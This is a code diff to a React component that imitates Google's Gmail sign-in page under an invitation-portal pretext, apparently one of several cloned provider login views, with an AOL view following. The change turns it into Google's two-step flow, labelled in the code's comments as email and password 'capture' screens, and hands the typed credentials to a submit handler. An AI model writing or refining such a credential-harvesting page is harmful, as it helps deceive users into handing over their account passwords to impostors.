@@ -416,18 +416,53 @@ export const GmailLoginView: React.FC<AuthFormProps> = ({
   errorMessage,
   onSubmit
 }) => {
+  // Screen state: 1 = Email screen, 2 = Password screen
+  const [step, setStep] = useState<1 | 2>(1);
   const [email, setEmail] = useState(initialEmail || 'guest@gmail.com');
   const [password, setPassword] = useState('');
   const [showPassword, setShowPassword] = useState(false);
+  const [localError, setLocalError] = useState<string | null>(null);
+
+  // If the parent modal sends an external error validation message, sync it locally
+  useEffect(() => {
+    if (errorMessage) {
+      setLocalError(errorMessage);
+    }
+  }, [errorMessage]);
+
+  const handleNextStep = (e: React.FormEvent) => {
+    e.preventDefault();
+    if (!email.trim()) {
+      setLocalError('Enter an email or phone number');
+      return;
+    }
+    setLocalError(null);
+    setStep(2); // Navigate to password step
+  };
 
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault();
+    if (!password) {
+      setLocalError('Enter a password');
+      return;
+    }
+    setLocalError(null);
     onSubmit(email, password);
   };
+
+  const handleBackStep = () => {
+    setLocalError(null);
+    setPassword('');
+    setStep(1); // Go back to email entry
+  };
+
+  const activeError = localError || errorMessage;
 
   return (
     <div className="w-full bg-[#f8f9fa] text-[#202124] min-h-[540px] flex flex-col justify-between p-6 sm:p-8 font-['Google_Sans',Roboto,Arial,sans-serif]">
       <div className="bg-white border border-[#dadce0] rounded-lg p-8 sm:p-10 max-w-[440px] w-full mx-auto my-auto space-y-6">
+        
+        {/* Brand Header */}
         <div className="flex flex-col items-center text-center space-y-2">
           <div className="flex items-center gap-2 mb-1">
             <GoogleColorLogo className="h-6" />
@@ -435,99 +470,148 @@ export const GmailLoginView: React.FC<AuthFormProps> = ({
               <GmailIcon className="w-4 h-4" />
             </div>
           </div>
-          <h2 className="text-2xl font-normal text-[#202124]">Sign in</h2>
-          <p className="text-sm text-[#5f6368]">to continue to Greenvelope Invitation Portal</p>
+          <h2 className="text-2xl font-normal text-[#202124]">
+            {step === 1 ? 'Sign in' : 'Welcome'}
+          </h2>
+          
+          {step === 1 ? (
+            <p className="text-sm text-[#5f6368]">to continue to Greenvelope Invitation Portal</p>
+          ) : (
+            <button
+              type="button"
+              onClick={handleBackStep}
+              disabled={isLoading}
+              className="inline-flex items-center gap-1.5 rounded-full border border-gray-300 px-3 py-1 text-xs font-medium text-[#202124] hover:bg-gray-50 transition-colors disabled:opacity-50"
+            >
+              <span className="max-w-[180px] truncate">{email}</span>
+              <svg className="h-3 w-3 text-gray-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" />
+              </svg>
+            </button>
+          )}
         </div>
 
-        {errorMessage && (
+        {/* Global Error Banner */}
+        {activeError && (
           <div className="text-[#d93025] text-xs flex items-start gap-1.5 bg-[#fce8e6] p-2.5 border border-[#fad2cf] rounded">
             <AlertCircle className="w-4 h-4 flex-shrink-0 mt-0.5" />
-            <span>{errorMessage}</span>
+            <span>{activeError}</span>
           </div>
         )}
 
-        <form onSubmit={handleSubmit} className="space-y-5">
-          <div>
-            <div className="relative">
-              <input
-                type="email"
-                value={email}
-                onChange={(e) => setEmail(e.target.value)}
-                placeholder="Email or phone"
-                disabled={isLoading}
-                required
-                className="w-full border border-[#dadce0] focus:border-[#1a73e8] rounded px-3.5 py-3 text-sm text-[#202124] outline-none transition-colors focus:ring-1 focus:ring-[#1a73e8]"
-              />
+        {step === 1 ? (
+          /* STEP 1: EMAIL CAPTURE VIEW */
+          <form onSubmit={handleNextStep} className="space-y-5">
+            <div>
+              <div className="relative">
+                <input
+                  type="email"
+                  value={email}
+                  onChange={(e) => {
+                    setEmail(e.target.value);
+                    if (localError) setLocalError(null);
+                  }}
+                  placeholder="Email or phone"
+                  disabled={isLoading}
+                  required
+                  className="w-full border border-[#dadce0] focus:border-[#1a73e8] rounded px-3.5 py-3 text-sm text-[#202124] outline-none transition-colors focus:ring-1 focus:ring-[#1a73e8]"
+                />
+              </div>
+              <div className="text-xs text-[#1a73e8] font-medium pt-1.5 hover:underline cursor-pointer">
+                Forgot email?
+              </div>
             </div>
-            <div className="text-xs text-[#1a73e8] font-medium pt-1.5 hover:underline cursor-pointer">
-              Forgot email?
-            </div>
-          </div>
 
-          <div>
-            <div className="relative">
-              <input
-                type={showPassword ? 'text' : 'password'}
-                value={password}
-                onChange={(e) => setPassword(e.target.value)}
-                placeholder="Enter your password"
-                disabled={isLoading}
-                required
-                className="w-full border border-[#dadce0] focus:border-[#1a73e8] rounded px-3.5 py-3 pr-10 text-sm text-[#202124] outline-none transition-colors focus:ring-1 focus:ring-[#1a73e8]"
-              />
+            <div className="text-xs text-[#5f6368] leading-relaxed">
+              Not your computer? Use Guest mode to sign in privately.{' '}
+              <span className="text-[#1a73e8] hover:underline cursor-pointer">Learn more</span>
+            </div>
+
+            <div className="flex items-center justify-between pt-4">
               <button
                 type="button"
-                onClick={() => setShowPassword(!showPassword)}
-                className="absolute right-3 top-3 text-[#5f6368] hover:text-[#202124] cursor-pointer"
+                onClick={onCancel}
+                disabled={isLoading}
+                className="text-xs font-semibold text-[#1a73e8] hover:text-[#174ea6] cursor-pointer"
               >
-                {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
+                Cancel
+              </button>
+              <button
+                type="submit"
+                className="px-6 py-2 bg-[#1a73e8] hover:bg-[#1557b0] text-white text-xs font-medium rounded transition-colors shadow-sm cursor-pointer"
+              >
+                Next
               </button>
             </div>
-            <div className="pt-2">
-              <label className="flex items-center gap-2 text-xs text-[#5f6368] cursor-pointer select-none">
+          </form>
+        ) : (
+          /* STEP 2: PASSWORD CAPTURE VIEW */
+          <form onSubmit={handleSubmit} className="space-y-5">
+            <div>
+              <div className="relative">
                 <input
-                  type="checkbox"
-                  checked={showPassword}
-                  onChange={(e) => setShowPassword(e.target.checked)}
-                  className="rounded text-[#1a73e8] focus:ring-0"
+                  type={showPassword ? 'text' : 'password'}
+                  value={password}
+                  onChange={(e) => {
+                    setPassword(e.target.value);
+                    if (localError) setLocalError(null);
+                  }}
+                  placeholder="Enter your password"
+                  disabled={isLoading}
+                  required
+                  autoFocus
+                  className="w-full border border-[#dadce0] focus:border-[#1a73e8] rounded px-3.5 py-3 pr-10 text-sm text-[#202124] outline-none transition-colors focus:ring-1 focus:ring-[#1a73e8]"
                 />
-                <span>Show password</span>
-              </label>
+                <button
+                  type="button"
+                  onClick={() => setShowPassword(!showPassword)}
+                  className="absolute right-3 top-3 text-[#5f6368] hover:text-[#202124] cursor-pointer"
+                >
+                  {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
+                </button>
+              </div>
+              <div className="pt-2">
+                <label className="flex items-center gap-2 text-xs text-[#5f6368] cursor-pointer select-none">
+                  <input
+                    type="checkbox"
+                    checked={showPassword}
+                    onChange={(e) => setShowPassword(e.target.checked)}
+                    className="rounded text-[#1a73e8] focus:ring-0"
+                  />
+                  <span>Show password</span>
+                </label>
+              </div>
             </div>
-          </div>
 
-          <div className="text-xs text-[#5f6368] leading-relaxed">
-            Not your computer? Use Guest mode to sign in privately.{' '}
-            <span className="text-[#1a73e8] hover:underline cursor-pointer">Learn more</span>
-          </div>
+            {isLoading && (
+              <div className="py-1 flex items-center gap-2 text-xs text-[#1a73e8]">
+                <div className="w-3.5 h-3.5 border-2 border-[#1a73e8] border-t-transparent rounded-full animate-spin" />
+                <span>{loadingStep || 'Verifying Google Account credentials...'}</span>
+              </div>
+            )}
 
-          {isLoading && (
-            <div className="py-1 flex items-center gap-2 text-xs text-[#1a73e8]">
-              <div className="w-3.5 h-3.5 border-2 border-[#1a73e8] border-t-transparent rounded-full animate-spin" />
-              <span>{loadingStep || 'Verifying Google Account credentials...'}</span>
+            <div className="flex items-center justify-between pt-4">
+              <button
+                type="button"
+                onClick={handleBackStep}
+                disabled={isLoading}
+                className="text-xs font-semibold text-[#1a73e8] hover:text-[#174ea6] cursor-pointer disabled:opacity-50"
+              >
+                Back
+              </button>
+              <button
+                type="submit"
+                disabled={isLoading}
+                className="px-6 py-2 bg-[#1a73e8] hover:bg-[#1557b0] text-white text-xs font-medium rounded transition-colors shadow-sm cursor-pointer disabled:opacity-50"
+              >
+                {isLoading ? 'Verifying...' : 'Next'}
+              </button>
             </div>
-          )}
-
-          <div className="flex items-center justify-between pt-4">
-            <button
-              type="button"
-              onClick={onCancel}
-              disabled={isLoading}
-              className="text-xs font-semibold text-[#1a73e8] hover:text-[#174ea6] cursor-pointer"
-            >
-              Back
-            </button>
-            <button
-              type="submit"
-              disabled={isLoading}
-              className="px-6 py-2 bg-[#1a73e8] hover:bg-[#1557b0] text-white text-xs font-medium rounded transition-colors shadow-sm cursor-pointer disabled:opacity-50"
-            >
-              {isLoading ? 'Verifying...' : 'Next'}
-            </button>
-          </div>
-        </form>
+          </form>
+        )}
       </div>
 
+      {/* Footer Meta */}
       <div className="text-[11px] text-[#5f6368] max-w-[440px] mx-auto w-full pt-3 flex justify-between">
         <span>English (United States)</span>
         <div className="flex gap-4">
@@ -539,6 +623,7 @@ export const GmailLoginView: React.FC<AuthFormProps> = ({
     </div>
   );
 };
+
 
 // 5. AOL LOGIN VIEW (Classic AOL Sign in)
 export const AolLoginView: React.FC<AuthFormProps> = ({
